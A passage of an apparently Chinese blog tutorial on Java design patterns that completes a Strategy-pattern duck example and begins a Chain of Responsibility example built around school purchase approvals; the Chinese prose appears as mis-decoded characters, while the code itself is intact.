<span class="hljs-title function_">setQuackBehavior</span><span class="hljs-params">(QuackBehavior quackBehavior)</span> &#123;<br>        <span class="hljs-built_in">this</span>.quackBehavior = quackBehavior;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>FlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">FlyBehavior</span> &#123;<br>   <br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span>; <span class="hljs-comment">// å­ç±»å…·ä½“å®ç°</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>GoodFlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GoodFlyBehavior</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; é£ç¿”æŠ€æœ¯é«˜è¶… ~~~&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>NoFlyBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoFlyBehavior</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FlyBehavior</span>&#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fly</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; ä¸ä¼šé£ç¿”  &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>PekingDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PekingDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <br>   <span class="hljs-comment">//å‡å¦‚åŒ—äº¬é¸­å¯ä»¥é£ç¿”ï¼Œä½†æ˜¯é£ç¿”æŠ€æœ¯ä¸€èˆ¬</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">PekingDuck</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      flyBehavior = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadFlyBehavior</span>();<br>      <br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.print(<span class="hljs-string">&quot;åŒ—äº¬é¸­=&gt;&quot;</span>);<br>   &#125;<br>   <br>   <br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>QuackBehavior.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">QuackBehavior</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span>;<span class="hljs-comment">//å­ç±»å®ç°</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>ToyDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ToyDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span>&#123;<br><br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ToyDuck</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      flyBehavior = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoFlyBehavior</span>();<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;ç©å…·é¸­=&gt;&quot;</span>);<br>   &#125;<br><br>   <span class="hljs-comment">//éœ€è¦é‡å†™çˆ¶ç±»çš„æ‰€æœ‰æ–¹æ³•</span><br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quack</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç©å…·é¸­ä¸èƒ½å«~~&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swim</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;ç©å…·é¸­ä¸ä¼šæ¸¸æ³³~~&quot;</span>);<br>   &#125;<br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure><p><code>WildDuck.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.strategy.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WildDuck</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Duck</span> &#123;<br><br>   <br>   <span class="hljs-comment">//æ„é€ å™¨ï¼Œä¼ å…¥FlyBehavor çš„å¯¹è±¡</span><br>   <span class="hljs-keyword">public</span>  <span class="hljs-title function_">WildDuck</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      flyBehavior = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GoodFlyBehavior</span>();<br>   &#125;<br>   <br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">display</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot; é‡é¸­=&gt; &quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coq"> é‡é¸­=&gt; <br> é£ç¿”æŠ€æœ¯é«˜è¶… ~~~<br>ç©å…·é¸­=&gt;<br> ä¸ä¼šé£ç¿”  <br>åŒ—äº¬é¸­=&gt; é£ç¿”æŠ€æœ¯ä¸€èˆ¬ <br>åŒ—äº¬é¸­çš„å®é™…é£ç¿”èƒ½åŠ›<br>åŒ—äº¬é¸­=&gt; ä¸ä¼šé£ç¿” <br></code></pre></td></tr></table></figure><h2 id="ç­–ç•¥æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#ç­–ç•¥æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> ç­–ç•¥æ¨¡å¼çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h2><ol><li><p>ç­–ç•¥æ¨¡å¼çš„å…³é”®æ˜¯ï¼šåˆ†æé¡¹ç›®ä¸­å˜åŒ–éƒ¨åˆ†ä¸ä¸å˜éƒ¨åˆ†</p></li><li><p>ç­–ç•¥æ¨¡å¼çš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå¤šç”¨ç»„åˆ/èšåˆ å°‘ç”¨ç»§æ‰¿ï¼›ç”¨è¡Œä¸ºç±»ç»„åˆï¼Œè€Œä¸æ˜¯è¡Œä¸ºçš„ç»§æ‰¿ã€‚æ›´æœ‰å¼¹æ€§</p></li><li><p>ä½“ç°äº†â€œå¯¹ä¿®æ”¹å…³é—­ï¼Œå¯¹æ‰©å±•å¼€æ”¾â€åŸåˆ™ï¼Œå®¢æˆ·ç«¯å¢åŠ è¡Œä¸ºä¸ç”¨ä¿®æ”¹åŸæœ‰ä»£ç ï¼Œåªè¦æ·»åŠ ä¸€ç§ç­–ç•¥ï¼ˆæˆ–è€…è¡Œä¸ºï¼‰å³å¯ï¼Œé¿å…äº†ä½¿ç”¨å¤šé‡è½¬ç§»è¯­å¥ï¼ˆifâ€¦else ifâ€¦elseï¼‰</p></li><li><p>æä¾›äº†å¯ä»¥æ›¿æ¢ç»§æ‰¿å…³ç³»çš„åŠæ³•ï¼š ç­–ç•¥æ¨¡å¼å°†ç®—æ³•å°è£…åœ¨ç‹¬ç«‹çš„ Strategy ç±»ä¸­ä½¿å¾—ä½ å¯ä»¥ç‹¬ç«‹äºå…¶ Context æ”¹å˜å®ƒï¼Œä½¿å®ƒæ˜“äºåˆ‡æ¢ã€æ˜“äºç†è§£ã€æ˜“äºæ‰©å±•</p></li><li><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯</strong>ï¼šæ¯æ·»åŠ ä¸€ä¸ªç­–ç•¥å°±è¦å¢åŠ ä¸€ä¸ªç±»ï¼Œå½“ç­–ç•¥è¿‡å¤šæ˜¯ä¼šå¯¼è‡´ç±»æ•°ç›®åº</p></li></ol><h1 id="è´£ä»»é“¾æ¨¡å¼"><a class="markdownIt-Anchor" href="#è´£ä»»é“¾æ¨¡å¼"></a> <mark>è´£ä»»é“¾æ¨¡å¼</mark></h1><p>é¡¾åæ€ä¹‰ï¼Œè´£ä»»é“¾æ¨¡å¼ï¼ˆChain of Responsibility Patternï¼‰ä¸ºè¯·æ±‚åˆ›å»ºäº†ä¸€ä¸ªæ¥æ”¶è€…å¯¹è±¡çš„é“¾ã€‚è¿™ç§æ¨¡å¼ç»™äºˆè¯·æ±‚çš„ç±»å‹ï¼Œå¯¹è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…è¿›è¡Œè§£è€¦ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚</p><p>åœ¨è¿™ç§æ¨¡å¼ä¸­ï¼Œé€šå¸¸æ¯ä¸ªæ¥æ”¶è€…éƒ½åŒ…å«å¯¹å¦ä¸€ä¸ªæ¥æ”¶è€…çš„å¼•ç”¨ã€‚å¦‚æœä¸€ä¸ªå¯¹è±¡ä¸èƒ½å¤„ç†è¯¥è¯·æ±‚ï¼Œé‚£ä¹ˆå®ƒä¼šæŠŠç›¸åŒçš„è¯·æ±‚ä¼ ç»™ä¸‹ä¸€ä¸ªæ¥æ”¶è€…ï¼Œä¾æ­¤ç±»æ¨ã€‚</p><h2 id="ä»‹ç»-22"><a class="markdownIt-Anchor" href="#ä»‹ç»-22"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> é¿å…è¯·æ±‚å‘é€è€…ä¸æ¥æ”¶è€…è€¦åˆåœ¨ä¸€èµ·ï¼Œè®©å¤šä¸ªå¯¹è±¡éƒ½æœ‰å¯èƒ½æ¥æ”¶è¯·æ±‚ï¼Œå°†è¿™äº›å¯¹è±¡è¿æ¥æˆä¸€æ¡é“¾ï¼Œå¹¶ä¸”æ²¿ç€è¿™æ¡é“¾ä¼ é€’è¯·æ±‚ï¼Œç›´åˆ°æœ‰å¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong><br />èŒè´£é“¾ä¸Šçš„å¤„ç†è€…è´Ÿè´£å¤„ç†è¯·æ±‚ï¼Œå®¢æˆ·åªéœ€è¦å°†è¯·æ±‚å‘é€åˆ°èŒè´£é“¾ä¸Šå³å¯ï¼Œæ— é¡»å…³å¿ƒè¯·æ±‚çš„å¤„ç†ç»†èŠ‚å’Œè¯·æ±‚çš„ä¼ é€’ï¼Œæ‰€ä»¥èŒè´£é“¾å°†è¯·æ±‚çš„å‘é€è€…å’Œè¯·æ±‚çš„å¤„ç†è€…è§£è€¦äº†ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> åœ¨å¤„ç†æ¶ˆæ¯çš„æ—¶å€™ä»¥è¿‡æ»¤å¾ˆå¤šé“ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> æ‹¦æˆªçš„ç±»éƒ½å®ç°ç»Ÿä¸€æ¥å£ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> Handler é‡Œé¢èšåˆå®ƒè‡ªå·±ï¼Œåœ¨ HandlerRequest é‡Œåˆ¤æ–­æ˜¯å¦åˆé€‚ï¼Œå¦‚æœæ²¡è¾¾åˆ°æ¡ä»¶åˆ™å‘ä¸‹ä¼ é€’ï¼Œå‘è°ä¼ é€’ä¹‹å‰ set è¿›å»ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€çº¢æ¥¼æ¢¦ä¸­çš„&quot;å‡»é¼“ä¼ èŠ±&quot;ã€‚ 2ã€JS ä¸­çš„äº‹ä»¶å†’æ³¡ã€‚ 3ã€JAVA WEB ä¸­ Apache Tomcat å¯¹ Encoding çš„å¤„ç†ï¼ŒStruts2 çš„æ‹¦æˆªå™¨ï¼Œjsp servlet çš„ Filterã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€é™ä½è€¦åˆåº¦ã€‚å®ƒå°†è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…è§£è€¦ã€‚ 2ã€ç®€åŒ–äº†å¯¹è±¡ã€‚ä½¿å¾—å¯¹è±¡ä¸éœ€è¦çŸ¥é“é“¾çš„ç»“æ„ã€‚3ã€å¢å¼ºç»™å¯¹è±¡æŒ‡æ´¾èŒè´£çš„çµæ´»æ€§ã€‚é€šè¿‡æ”¹å˜é“¾å†…çš„æˆå‘˜æˆ–è€…è°ƒåŠ¨å®ƒä»¬çš„æ¬¡åºï¼Œå…è®¸åŠ¨æ€åœ°æ–°å¢æˆ–è€…åˆ é™¤è´£ä»»ã€‚ 4ã€å¢åŠ æ–°çš„è¯·æ±‚å¤„ç†ç±»å¾ˆæ–¹ä¾¿ã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong> 1ã€ä¸èƒ½ä¿è¯è¯·æ±‚ä¸€å®šè¢«æ¥æ”¶ã€‚ 2ã€ç³»ç»Ÿæ€§èƒ½å°†å—åˆ°ä¸€å®šå½±å“ï¼Œè€Œä¸”åœ¨è¿›è¡Œä»£ç è°ƒè¯•æ—¶ä¸å¤ªæ–¹ä¾¿ï¼Œå¯èƒ½ä¼šé€ æˆå¾ªç¯è°ƒç”¨ã€‚<br />3ã€å¯èƒ½ä¸å®¹æ˜“è§‚å¯Ÿè¿è¡Œæ—¶çš„ç‰¹å¾ï¼Œæœ‰ç¢äºé™¤é”™ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€æœ‰å¤šä¸ªå¯¹è±¡å¯ä»¥å¤„ç†åŒä¸€ä¸ªè¯·æ±‚ï¼Œå…·ä½“å“ªä¸ªå¯¹è±¡å¤„ç†è¯¥è¯·æ±‚ç”±è¿è¡Œæ—¶åˆ»è‡ªåŠ¨ç¡®å®šã€‚<br />2ã€åœ¨ä¸æ˜ç¡®æŒ‡å®šæ¥æ”¶è€…çš„æƒ…å†µä¸‹ï¼Œå‘å¤šä¸ªå¯¹è±¡ä¸­çš„ä¸€ä¸ªæäº¤ä¸€ä¸ªè¯·æ±‚ã€‚ 3ã€å¯åŠ¨æ€æŒ‡å®šä¸€ç»„å¯¹è±¡å¤„ç†è¯·æ±‚ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> åœ¨ JAVA WEB ä¸­é‡åˆ°å¾ˆå¤šåº”ç”¨ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105183130277.png" alt="image-20230105183130277" /></p><p>å¯¹åŸç†ç±»å›¾çš„è¯´æ˜-å³(èŒè´£é“¾æ¨¡å¼çš„è§’è‰²åŠèŒè´£)</p><ol><li><p>Handler : æŠ½è±¡çš„å¤„ç†è€…, å®šä¹‰äº†ä¸€ä¸ªå¤„ç†è¯·æ±‚çš„æ¥å£, åŒæ—¶å«ä¹‰å¦å¤– Handler</p></li><li><p>ConcreteHandlerA , B æ˜¯å…·ä½“çš„å¤„ç†è€…, å¤„ç†å®ƒè‡ªå·±è´Ÿè´£çš„è¯·æ±‚ï¼Œ å¯ä»¥è®¿é—®å®ƒçš„åç»§è€…(å³ä¸‹ä¸€ä¸ªå¤„ç†è€…), å¦‚æœå¯ä»¥å¤„ç†å½“å‰è¯·æ±‚ï¼Œåˆ™å¤„ç†ï¼Œå¦åˆ™å°±å°†è¯¥è¯·æ±‚äº¤ä¸ª åç»§è€…å»å¤„ç†ï¼Œä»è€Œå½¢æˆä¸€ä¸ªèŒè´£é“¾</p></li><li><p>Request ï¼Œ å«ä¹‰å¾ˆå¤šå±æ€§ï¼Œè¡¨ç¤ºä¸€ä¸ªè¯·æ±‚</p></li></ol><h2 id="å®ç°-20"><a class="markdownIt-Anchor" href="#å®ç°-20"></a> å®ç°</h2><ol><li>åº”ç”¨å®ä¾‹è¦æ±‚</li></ol><p>ç¼–å†™ç¨‹åºå®Œæˆå­¦æ ¡ OA ç³»ç»Ÿçš„é‡‡è´­å®¡æ‰¹é¡¹ç›®ï¼šéœ€æ±‚</p><p>é‡‡è´­å‘˜é‡‡è´­æ•™å­¦å™¨æ</p><p>å¦‚æœé‡‘é¢ å°äºç­‰äº 5000, ç”±æ•™å­¦ä¸»ä»»å®¡æ‰¹</p><p>å¦‚æœé‡‘é¢ å°äºç­‰äº 10000, ç”±é™¢é•¿å®¡æ‰¹</p><p>å¦‚æœé‡‘é¢ å°äºç­‰äº 30000, ç”±å‰¯æ ¡é•¿å®¡æ‰¹</p><p>å¦‚æœé‡‘é¢ è¶…è¿‡ 30000 ä»¥ä¸Šï¼Œæœ‰æ ¡é•¿å®¡æ‰¹</p><ol start="2"><li>æ€è·¯åˆ†æå’Œå›¾è§£(ç±»å›¾)</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230105184409277.png" alt="image-20230105184409277" /></p><p><code>Approver.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>    Approver approver;  <span class="hljs-comment">//ä¸‹ä¸€ä¸ªå¤„ç†è€…</span><br>    String name; <span class="hljs-comment">// åå­—</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Approver</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-comment">//ä¸‹ä¸€ä¸ªå¤„ç†è€…</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setApprover</span><span class="hljs-params">(Approver approver)</span> &#123;<br>        <span class="hljs-built_in">this</span>.approver = approver;<br>    &#125;<br><br>    <span class="hljs-comment">//å¤„ç†å®¡æ‰¹è¯·æ±‚çš„æ–¹æ³•ï¼Œå¾—åˆ°ä¸€ä¸ªè¯·æ±‚, å¤„ç†æ˜¯å­ç±»å®Œæˆï¼Œå› æ­¤è¯¥æ–¹æ³•åšæˆæŠ½è±¡</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>Client.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªè¯·æ±‚</span><br>      <span class="hljs-type">PurchaseRequest</span> <span class="hljs-variable">purchaseRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PurchaseRequest</span>(<span class="hljs-number">1</span>, <span class="hljs-number">31000</span>, <span class="hljs-number">1</span>);<br>      <br>      <span class="hljs-comment">//åˆ›å»ºç›¸å…³çš„å®¡æ‰¹äºº</span><br>      <span class="hljs-type">DepartmentApprover</span> <span class="hljs-variable">departmentApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DepartmentApprover</span>(<span class="hljs-string">&quot;å¼ ä¸»ä»»&quot;</span>);<br>      <span class="hljs-type">CollegeApprover</span> <span class="hljs-variable">collegeApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CollegeApprover</span>(<span class="hljs-string">&quot;æé™¢é•¿&quot;</span>);<br>      <span class="hljs-type">ViceSchoolMasterApprover</span> <span class="hljs-variable">viceSchoolMasterApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ViceSchoolMasterApprover</span>(<span class="hljs-string">&quot;ç‹å‰¯æ ¡&quot;</span>);<br>      <span class="hljs-type">SchoolMasterApprover</span> <span class="hljs-variable">schoolMasterApprover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SchoolMasterApprover</span>(<span class="hljs-string">&quot;ä½Ÿæ ¡é•¿&quot;</span>);<br>   <br>   <br>      <span class="hljs-comment">//éœ€è¦å°†å„ä¸ªå®¡æ‰¹çº§åˆ«çš„ä¸‹ä¸€ä¸ªè®¾ç½®å¥½ (å¤„ç†äººæ„æˆç¯å½¢: )</span><br>      departmentApprover.setApprover(collegeApprover);<br>      collegeApprover.setApprover(viceSchoolMasterApprover);<br>      viceSchoolMasterApprover.setApprover(schoolMasterApprover);<br>      schoolMasterApprover.setApprover(departmentApprover);<br>      <br><br>      departmentApprover.processRequest(purchaseRequest);<br>      viceSchoolMasterApprover.processRequest(purchaseRequest);<br><br>      <span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªè¯·æ±‚</span><br>      <span class="hljs-type">PurchaseRequest</span> <span class="hljs-variable">purchaseRequest1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PurchaseRequest</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10000</span>, <span class="hljs-number">2</span>);<br><br><br>      departmentApprover.processRequest(purchaseRequest1);<br>      viceSchoolMasterApprover.processRequest(purchaseRequest1);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>CollegeApprover.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.responsibilitychain;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * é™¢é•¿</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CollegeApprover</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Approver</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-title function_">CollegeApprover</span><span class="hljs-params">(String name)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated constructor stub</span><br>      <span class="hljs-built_in">super</span>(name);<br>   &#125;<br>   <br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processRequest</span><span class="hljs-params">(PurchaseRequest purchaseRequest)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-keyword">if</span>(purchaseRequest.getPrice() &gt; <span class="hljs-number">5000</span> &amp;&amp; purchaseRequest.getPrice() &lt;= <span class="hljs-number">10000</span>) &#123;<br>         